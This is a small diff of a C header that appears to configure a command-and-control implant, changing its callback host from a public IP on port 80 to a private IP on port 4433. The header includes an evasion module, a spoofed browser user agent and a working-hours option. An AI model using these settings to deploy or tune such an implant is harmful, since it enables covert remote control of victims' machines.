@@ -3,8 +3,8 @@
 #include <constexpr.h>
 #include <evasion.h>
 
-#define CONFIG_HOST       L"212.56.32.90"
-#define CONFIG_PORT       80
+#define CONFIG_HOST       L"172.29.29.80"
+#define CONFIG_PORT       4433
 #define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
